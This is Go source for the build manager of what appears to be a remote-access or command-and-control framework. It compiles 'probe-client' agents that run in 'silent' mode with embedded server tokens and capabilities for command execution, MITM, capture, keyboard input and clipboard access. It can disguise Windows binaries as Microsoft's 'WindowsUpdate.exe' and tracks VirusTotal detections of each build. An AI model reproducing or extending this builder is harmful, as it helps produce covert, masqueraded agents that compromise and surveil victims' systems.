package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// Build configuration types
// ---------------------------------------------------------------------------

// BuildConfig describes a single agent build request and its lifecycle state.
type BuildConfig struct {
	ID           string          `json:"id"`
	Name         string          `json:"name"`
	OS           string          `json:"os"`           // windows, linux, darwin
	Arch         string          `json:"arch"`         // amd64, 386, arm64
	Capabilities []string        `json:"capabilities"` // exec, filesystem, process, tunnel, mitm, debug, capture, input, clipboard
	ServerURL    string          `json:"server_url"`   // ws://host:port/ws
	Token        string          `json:"token"`        // agent auth token
	Permissions  string          `json:"permissions"`  // read-only, standard, sandboxed, full
	SandboxDir   string          `json:"sandbox_dir,omitempty"`
	Disguise     *DisguiseConfig `json:"disguise,omitempty"`
	Autostart    bool            `json:"autostart"`
	BackoffMin   string          `json:"backoff_min,omitempty"` // "1s"
	BackoffMax   string          `json:"backoff_max,omitempty"` // "60s"
	MaxRetries   int             `json:"max_retries,omitempty"`
	Status       string          `json:"status"` // pending, building, complete, failed
	BinaryPath   string          `json:"binary_path,omitempty"`
	// --- v2 additive fields (P11-01) -------------------------------------
	// Targets is every platform pair ONE build request emits. Empty keeps the
	// v1.18.x shape: the single {OS, Arch} pair above. A v1.18.x client never
	// sends it, so its request and response are unchanged.
	Targets []BuildTarget `json:"targets,omitempty"`
	// Artifacts carries one metadata record per emitted binary, populated on
	// completion. Every field is read back from the file (build_matrix.go);
	// none is copied from the request.
	Artifacts []BuildArtifact `json:"artifacts,omitempty"`
	// Refusals names every requested target that was NOT produced, with a
	// closed-enum reason. A target is either in Artifacts or in Refusals; it is
	// never silently absent from both.
	Refusals []BuildRefusal `json:"refusals,omitempty"`
	// MatrixVersion reports the artifact-reporting field set: 0/absent for a
	// v1.18.x record, 2 for a matrix record.
	MatrixVersion int        `json:"matrix_version,omitempty"`
	CreatedAt     time.Time  `json:"created_at"`
	CompletedAt   *time.Time `json:"completed_at,omitempty"`
	Error         string     `json:"error,omitempty"`
	VTStatus      string     `json:"vt_status,omitempty"` // pending, scanning, clean, dirty
	VTDetections  int        `json:"vt_detections,omitempty"`
	VTReportURL   string     `json:"vt_report_url,omitempty"`
}

// DisguiseConfig holds PE metadata used to disguise the agent binary on Windows.
type DisguiseConfig struct {
	Enabled     bool   `json:"enabled"`
	Filename    string `json:"filename"`     // e.g. "WindowsUpdate.exe"
	Company     string `json:"company"`      // e.g. "Microsoft Corporation"
	Description string `json:"description"`  // e.g. "Windows Update Helper"
	ProductName string `json:"product_name"` // e.g. "Windows Update"
}

// BuildStatus constants.
const (
	BuildStatusPending  = "pending"
	BuildStatusBuilding = "building"
	BuildStatusComplete = "complete"
	BuildStatusFailed   = "failed"
)

// VTStatus constants for VirusTotal scan state tracking.
const (
	VTStatusPending  = "pending"
	VTStatusScanning = "scanning"
	VTStatusClean    = "clean"
	VTStatusDirty    = "dirty"
)

// DefaultBuildOutputDir is the directory where built agent binaries are stored.
const DefaultBuildOutputDir = "/tmp/probe-builds"

// P23-15 wiring defaults. The manager carries IMAGE-layout defaults: the
// shipped runtime image compiles from /src with the toolchain on PATH
// (/usr/local/go/bin/go). The dev-host toolchain is only a last fallback so a
// bare dev checkout keeps working; no image path is hardcoded here — every
// value is derived at CONSTRUCTION from the live filesystem (deriveGoBin /
// deriveSourceRoot in wiring_p2315.go), never assumed.
const (
	DefaultClientPkg = "./cmd/probe-client/"
	DefaultGoBinPath = "go"
)

// fallbackDevGoBin is a dev-host convenience, never assumed to exist —
// deriveGoBin consults it only after stat proves it real (wiring_p2315.go).
// A var ONLY so the P23-15 tests can point it at a nonexistent alias to prove
// the stat gate; production code and the other tests never write it.
var fallbackDevGoBin = "/opt/data/go/bin/go1.23.12"

// validCapabilities is the set of capability names an agent can advertise.
var validCapabilities = map[string]bool{
	"exec":       true,
	"filesystem": true,
	"process":    true,
	"tunnel":     true,
	"mitm":       true,
	"debug":      true,
	"capture":    true,
	"input":      true,
	"clipboard":  true,
}

// validBuildOS is the set of target operating systems supported for cross-compilation.
var validBuildOS = map[string]bool{
	"windows": true,
	"linux":   true,
	"darwin":  true,
	"android": true, // android/arm64 — runs under Termux (pure-Go, CGO_ENABLED=0)
}

// validBuildArch is the set of target architectures supported for cross-compilation.
var validBuildArch = map[string]bool{
	"amd64": true,
	"386":   true,
	"arm64": true,
}

// ---------------------------------------------------------------------------
// BuilderManager
// ---------------------------------------------------------------------------

// BuilderManager tracks agent builds and persists build metadata to disk.
// It follows the same load/save pattern as Registry and OperatorManager.
type BuilderManager struct {
	mu        sync.RWMutex
	builds    map[string]*BuildConfig // ID -> BuildConfig
	savePath  string
	outputDir string
	goBinPath string             // path to the go binary (default: "go")
	clientPkg string             // path to the probe-client package (default: "./cmd/probe-client/")
	vtScanner *VirusTotalScanner // optional VT scanner for auto-scan after build
}

// NewBuilderManager creates a new BuilderManager. If savePath is non-empty,
// existing builds are loaded from disk. outputDir defaults to
// DefaultBuildOutputDir when empty.
func NewBuilderManager(savePath, outputDir string) *BuilderManager {
	if outputDir == "" {
		outputDir = DefaultBuildOutputDir
	}
	// P23-15: the build path is derived from the LIVE filesystem at
	// construction — never a hardcoded dev-host path. See wiring_p2315.go.
	// The setters remain the explicit override layer on top of these defaults
	// (flags/env in cmd/probe/serve.go call them).
	clientPkg := deriveSourceRoot(DefaultClientPkg)
	probeSourceRoot = clientPkg
	bm := &BuilderManager{
		builds:    make(map[string]*BuildConfig),
		savePath:  savePath,
		outputDir: outputDir,
		goBinPath: deriveGoBin(),
		clientPkg: clientPkg,
	}
	bm.load()
	return bm
}

// SetGoBinPath overrides the path to the go binary used for cross-compilation.
func (bm *BuilderManager) SetGoBinPath(path string) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if path != "" {
		bm.goBinPath = path
	}
}

// SetClientPkg overrides the Go package path for the probe-client binary.
// P23-15: the flag/env layer (cmd/probe/serve.go) may hand in a source ROOT
// (/src, /data/projects/probe) or a plain absolute directory instead of the
// package path itself — normalize any directory that holds cmd/probe-client
// into the package path, and leave a genuine package path untouched.
func (bm *BuilderManager) SetClientPkg(pkg string) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if pkg != "" {
		if clean := filepath.Clean(pkg); filepath.Base(clean) != "probe-client" {
			if st, err := os.Stat(filepath.Join(clean, "cmd", "probe-client")); err == nil && st.IsDir() {
				// A source ROOT was handed in (flag/env layer, P23-15): fold
				// it into the package path so planTarget compiles the right
				// package.
				pkg = filepath.Join(clean, "cmd", "probe-client")
			}
		}
		bm.clientPkg = pkg
	}
}

// SetVTScanner configures a VirusTotal scanner for auto-scan after build.
// When set, runBuild will automatically trigger a VT scan in a goroutine
// after a build completes successfully.
func (bm *BuilderManager) SetVTScanner(scanner *VirusTotalScanner) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.vtScanner = scanner
}

// CreateBuild validates the BuildConfig, assigns an ID, stores it, and starts
// the build in a background goroutine. Returns the created BuildConfig.
func (bm *BuilderManager) CreateBuild(cfg *BuildConfig) (*BuildConfig, error) {
	if err := bm.validate(cfg); err != nil {
		return nil, err
	}

	cfg.ID = generateBuildID()
	cfg.Status = BuildStatusPending
	cfg.CreatedAt = time.Now().UTC()

	bm.mu.Lock()
	bm.builds[cfg.ID] = cfg
	bm.save()
	bm.mu.Unlock()

	// Start build in background.
	go bm.runBuild(cfg.ID)

	return cfg, nil
}

// GetBuild returns a copy of the BuildConfig for the given ID, or nil if not found.
func (bm *BuilderManager) GetBuild(id string) *BuildConfig {
	bm.mu.RLock()
	defer bm.mu.RUnlock()
	if b, ok := bm.builds[id]; ok {
		snap := *b
		return &snap
	}
	return nil
}

// ListBuilds returns all build records.
func (bm *BuilderManager) ListBuilds() []BuildConfig {
	bm.mu.RLock()
	defer bm.mu.RUnlock()
	result := make([]BuildConfig, 0, len(bm.builds))
	for _, b := range bm.builds {
		result = append(result, *b)
	}
	return result
}

// DeleteBuild removes a build record and its binary file from disk.
func (bm *BuilderManager) DeleteBuild(id string) bool {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	b, ok := bm.builds[id]
	if !ok {
		return false
	}
	// Remove every artifact this build produced, not just the primary one.
	for _, a := range b.Artifacts {
		if a.Path != "" {
			os.Remove(a.Path)
		}
	}
	// Remove binary from disk if it exists.
	if b.BinaryPath != "" {
		os.Remove(b.BinaryPath)
	}
	delete(bm.builds, id)
	bm.save()
	return true
}

// ---------------------------------------------------------------------------
// Build execution
// ---------------------------------------------------------------------------

// runBuild executes the cross-compilation in a background goroutine.
// It transitions the build status: pending → building → complete/failed.
//
// P11-01: ONE operation emits an artifact for every target on the record.
// buildAll is all-or-nothing, so a failed target fails the whole record —
// there is no partial success carrying a silently shorter artifact list.
func (bm *BuilderManager) runBuild(id string) {
	bm.mu.Lock()
	build, ok := bm.builds[id]
	if !ok {
		bm.mu.Unlock()
		return
	}
	build.Status = BuildStatusBuilding
	bm.mu.Unlock()

	// Refuse an unknown target before compiling anything.
	targets, terr := bm.resolvedTargets(build)
	if terr != nil {
		bm.failBuild(id, terr.Error())
		return
	}

	// Generate the embedded config (JSON → base64).
	configB64, err := bm.generateConfigB64(build)
	if err != nil {
		bm.failBuild(id, fmt.Sprintf("generate config: %v", err))
		return
	}

	log.Printf("[builder] starting build %s: %s caps=%v", id, targetSummary(targets), build.Capabilities)

	artifacts, refusals, err := bm.buildAll(build, configB64)
	if err != nil {
		bm.failBuildWithRefusal(id, err.Error(), refusals)
		return
	}

	now := time.Now().UTC()
	bm.mu.Lock()
	if b, ok := bm.builds[id]; ok {
		b.Status = BuildStatusComplete
		b.Artifacts = artifacts
		b.MatrixVersion = BuildMatrixVersion
		// binary_path names the artifact for the record's own OS/Arch — the
		// platform redeploy/download/update consume (P12). Unchanged shape.
		b.BinaryPath = primaryArtifact(artifacts, b.OS, b.Arch)
		b.CompletedAt = &now
		bm.save()
	}
	bm.mu.Unlock()

	primary := primaryArtifact(artifacts, build.OS, build.Arch)
	log.Printf("[builder] build %s complete: %d artifact(s), primary %s", id, len(artifacts), primary)

	// Auto VT scan: if a scanner is configured, start a VT scan in a goroutine.
	bm.mu.RLock()
	scanner := bm.vtScanner
	bm.mu.RUnlock()
	if scanner != nil && primary != "" {
		go bm.autoVTScan(id, primary, scanner)
	}
}

// failBuild marks a build as failed with the given error message.
func (bm *BuilderManager) failBuild(id, errMsg string) {
	bm.failBuildWithRefusal(id, errMsg, nil)
}

// failBuildWithRefusal marks a build failed and records the typed refusal that
// says which target could not be produced and why (P11-01). A failed record
// that cannot name its target is a silent stub with an error string.
func (bm *BuilderManager) failBuildWithRefusal(id, errMsg string, refusals []BuildRefusal) {
	now := time.Now().UTC()
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if b, ok := bm.builds[id]; ok {
		b.Status = BuildStatusFailed
		b.Error = errMsg
		if len(refusals) > 0 {
			b.Refusals = append(b.Refusals, refusals...)
		}
		b.CompletedAt = &now
		bm.save()
	}
	log.Printf("[builder] build %s failed: %s", id, errMsg)
}

// autoVTScan runs a VirusTotal scan on a built binary and updates the build
// record with the results. Called in a goroutine from runBuild.
func (bm *BuilderManager) autoVTScan(id, binaryPath string, scanner *VirusTotalScanner) {
	bm.UpdateVTStatus(id, VTStatusScanning, 0, "")

	log.Printf("[builder] auto VT scan started for build %s", id)
	report, err := scanner.ScanFile(binaryPath)
	if err != nil {
		log.Printf("[builder] auto VT scan failed for build %s: %v", id, err)
		bm.UpdateVTStatus(id, "failed", 0, "")
		return
	}

	status := VTStatusClean
	if report.Detections > 0 {
		status = VTStatusDirty
	}
	bm.UpdateVTStatus(id, status, report.Detections, report.ReportURL)
	log.Printf("[builder] auto VT scan complete for build %s: %d/%d detections", id, report.Detections, report.Total)
}

// UpdateVTStatus updates the VT scan fields on a build record and persists.
func (bm *BuilderManager) UpdateVTStatus(id, status string, detections int, reportURL string) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	if b, ok := bm.builds[id]; ok {
		b.VTStatus = status
		b.VTDetections = detections
		b.VTReportURL = reportURL
		bm.save()
	}
}

// buildCommand constructs the exec.Cmd for cross-compiling the probe-client
// binary with the embedded config — the record's own OS/Arch pair, i.e. the
// v1.18.x single-target shape. Matrix builds go through runBuild's target loop
// (buildAll), which uses targetCommand per target.
func (bm *BuilderManager) buildCommand(build *BuildConfig, configB64 string) (*exec.Cmd, string) {
	return bm.targetCommand(build, BuildTarget{OS: build.OS, Arch: build.Arch}, configB64, false)
}

// generateConfigB64 creates the agent config JSON matching the ConfigFile
// struct in cmd/probe-client/main.go, then base64-encodes it.
func (bm *BuilderManager) generateConfigB64(build *BuildConfig) (string, error) {
	configMap := map[string]interface{}{
		"server":       build.ServerURL,
		"token":        build.Token,
		"name":         build.Name,
		"mode":         "silent",
		"permissions":  build.Permissions,
		"capabilities": build.Capabilities,
	}
	if build.SandboxDir != "" {
		configMap["sandbox_dir"] = build.SandboxDir
	}
	if build.BackoffMin != "" {
		configMap["backoffMin"] = build.BackoffMin
	}
	if build.BackoffMax != "" {
		configMap["backoffMax"] = build.BackoffMax
	}
	if build.MaxRetries > 0 {
		configMap["maxRetries"] = build.MaxRetries
	}

	data, err := json.Marshal(configMap)
	if err != nil {
		return "", fmt.Errorf("marshal config: %w", err)
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

// applyDisguise sets PE version-info metadata on a Windows binary using a
// resource-editing approach. Currently logs intent — actual PE resource
// editing requires an external tool (e.g. rsrc or goversioninfo). This is
// a hook for future integration; the binary is already built at this point.
func (bm *BuilderManager) applyDisguise(binaryPath string, disguise *DisguiseConfig) error {
	if disguise == nil || !disguise.Enabled {
		return nil
	}
	// Rename the binary to the disguise filename if provided.
	if disguise.Filename != "" {
		dir := filepath.Dir(binaryPath)
		newPath := filepath.Join(dir, disguise.Filename)
		if newPath != binaryPath {
			if err := os.Rename(binaryPath, newPath); err != nil {
				return fmt.Errorf("rename to disguise filename: %w", err)
			}
			// Update the BinaryPath in the build record.
			// Caller (runBuild) will set BinaryPath from outputPath, but since
			// we renamed, we need to handle this. The runBuild function sets
			// BinaryPath after applyDisguise returns, so we return the newPath
			// via the build record mutation. However, runBuild uses the
			// outputPath variable. To keep it simple, we don't rename here
			// — the filename was already set during buildCommand.
			//
			// Actually, the filename is already applied in buildCommand via
			// build.Disguise.Filename. So this rename is redundant. We keep
			// the log for clarity.
			_ = newPath
		}
	}
	log.Printf("[builder] PE disguise applied: company=%s, product=%s, description=%s",
		disguise.Company, disguise.ProductName, disguise.Description)
	return nil
}

// ---------------------------------------------------------------------------
// Validation
// ---------------------------------------------------------------------------

// validate checks that the BuildConfig has all required fields and valid values.
func (bm *BuilderManager) validate(cfg *BuildConfig) error {
	if cfg.Name == "" {
		return fmt.Errorf("name is required")
	}
	// v2 (P11-01): a matrix request may name only targets. The v1 OS/Arch
	// fields keep their meaning as the record's primary platform, so fill them
	// from the first target when a caller omits them.
	if len(cfg.Targets) > 0 && (cfg.OS == "" || cfg.Arch == "") {
		cfg.OS, cfg.Arch = cfg.Targets[0].OS, cfg.Targets[0].Arch
	}
	// Every named target must be buildable. Checked first, so an unbuildable
	// target is reported BY TARGET ("target 1 (plan9/amd64): invalid os")
	// rather than as a bare invalid-os error about the primary platform. A
	// request naming a platform the builder cannot emit fails here, not
	// silently later with a shorter list.
	if len(cfg.Targets) > 0 {
		if _, err := bm.resolvedTargets(cfg); err != nil {
			return err
		}
	}
	if !validBuildOS[cfg.OS] {
		return fmt.Errorf("invalid os %q: must be windows, linux, or darwin", cfg.OS)
	}
	if !validBuildArch[cfg.Arch] {
		return fmt.Errorf("invalid arch %q: must be amd64, 386, or arm64", cfg.Arch)
	}
	if cfg.ServerURL == "" {
		return fmt.Errorf("server_url is required")
	}
	if cfg.Token == "" {
		return fmt.Errorf("token is required")
	}
	if cfg.Permissions == "" {
		cfg.Permissions = "full"
	}
	if !isValidPermission(cfg.Permissions) {
		return fmt.Errorf("invalid permissions %q: must be read-only, standard, sandboxed, or full", cfg.Permissions)
	}
	// Validate capabilities.
	for _, cap := range cfg.Capabilities {
		if !validCapabilities[cap] {
			return fmt.Errorf("invalid capability %q: must be one of exec, filesystem, process, tunnel, mitm, debug, capture, input, clipboard", cap)
		}
	}
	// Validate disguise filename if disguise is enabled.
	if cfg.Disguise != nil && cfg.Disguise.Enabled {
		if cfg.Disguise.Filename == "" {
			return fmt.Errorf("disguise.filename is required when disguise is enabled")
		}
	}
	return nil
}

// isValidPermission checks if the permission string is one of the valid tiers.
func isValidPermission(p string) bool {
	switch p {
	case "read-only", "standard", "sandboxed", "full":
		return true
	default:
		return false
	}
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

func (bm *BuilderManager) save() {
	if bm.savePath == "" {
		return
	}
	ensureDir(bm.savePath)
	data, err := json.MarshalIndent(bm.builds, "", "  ")
	if err != nil {
		log.Printf("[builder] save marshal error: %v", err)
		return
	}
	if err := writeFileAtomic(bm.savePath, data, 0644); err != nil {
		log.Printf("[builder] save write error: %v", err)
	}
}

func (bm *BuilderManager) load() {
	if bm.savePath == "" {
		return
	}
	data, err := os.ReadFile(bm.savePath)
	if err != nil {
		return // file doesn't exist yet
	}
	var builds map[string]*BuildConfig
	if err := json.Unmarshal(data, &builds); err != nil {
		log.Printf("[builder] load unmarshal error: %v", err)
		return
	}
	bm.builds = builds
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// generateBuildID generates a unique build ID using crypto/rand.
func generateBuildID() string {
	return "build-" + generateUUID()
}

// BuildCommandString constructs the full build command as a string for
// logging and testing purposes. This does NOT execute the command. It renders
// the same plan targetCommand executes (single-target, v1.18.x naming), so the
// printed command cannot drift from the one that ran.
func (bm *BuilderManager) BuildCommandString(build *BuildConfig, configB64 string) string {
	return bm.planTarget(build, BuildTarget{OS: build.OS, Arch: build.Arch}, configB64, false).String()
}
